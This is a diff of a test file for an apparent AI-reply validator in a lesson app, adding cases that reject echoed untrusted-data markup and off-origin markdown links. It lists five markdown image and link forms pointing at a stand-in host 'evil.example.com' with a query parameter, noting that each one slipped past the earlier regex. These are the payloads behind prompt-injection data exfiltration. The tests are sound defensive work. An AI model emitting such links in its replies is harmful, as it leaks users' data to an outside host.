@@ -7,19 +7,6 @@ const { mockLogSecurityEvent } = vi.hoisted(() => ({
 vi.mock("@/server/services/_shared/aiGuard/securityLog", () => ({
 	logSecurityEvent: mockLogSecurityEvent,
 }));
-// OpenAIEmbeddings is pulled in transitively via lessonAI.agent's RAG tools.
-vi.mock("@langchain/openai", () => ({
-	ChatOpenAI: class {},
-	OpenAIEmbeddings: class {
-		embedQuery() {
-			return Promise.resolve([]);
-		}
-		embedDocuments() {
-			return Promise.resolve([]);
-		}
-	},
-}));
-
 const { validateReply } = await import("./validateReply");
 
 const ctx = (retrievedContent: string[] = []) => ({
@@ -50,6 +37,11 @@ describe("validateReply", () => {
 			'Here it is: <untrusted_data source="lesson_content">',
 			ctx(),
 		);
+		expect(result).toEqual({ valid: false, ruleId: "untrusted_data_echo" });
+	});
+
+	it("rejects the untrusted-data markup whatever its casing", () => {
+		const result = validateReply("Here it is: <UNTRUSTED_DATA>", ctx());
 		expect(result).toEqual({ valid: false, ruleId: "untrusted_data_echo" });
 	});
 
@@ -85,6 +77,38 @@ describe("validateReply", () => {
 			valid: false,
 			ruleId: "off_origin_link",
 		});
+	});
+
+	// CommonMark spells a destination four ways and every one of them renders.
+	// Each of these walked past the original inline-only regex.
+	describe.each([
+		[
+			"a title after the destination",
+			'![x](https://evil.example.com/?d=s "t")',
+		],
+		[
+			"a whitespace-padded destination",
+			"![x]( https://evil.example.com/?d=s )",
+		],
+		["a pointy-bracket destination", "![x](<https://evil.example.com/?d=s>)"],
+		[
+			"a reference definition",
+			"![x][ref]\n\n[ref]: https://evil.example.com/?d=s",
+		],
+		["an autolink", "Look here: <https://evil.example.com/?d=s>"],
+	])("off-origin destinations", (label, reply) => {
+		it(`rejects ${label}`, () => {
+			expect(validateReply(reply, ctx())).toEqual({
+				valid: false,
+				ruleId: "off_origin_link",
+			});
+		});
+	});
+
+	it("allows an in-app reference definition", () => {
+		expect(
+			validateReply("See [it][ref].\n\n[ref]: /dashboard/lesson-2", ctx()),
+		).toEqual({ valid: true });
 	});
 
 	it("allows a relative in-app link", () => {
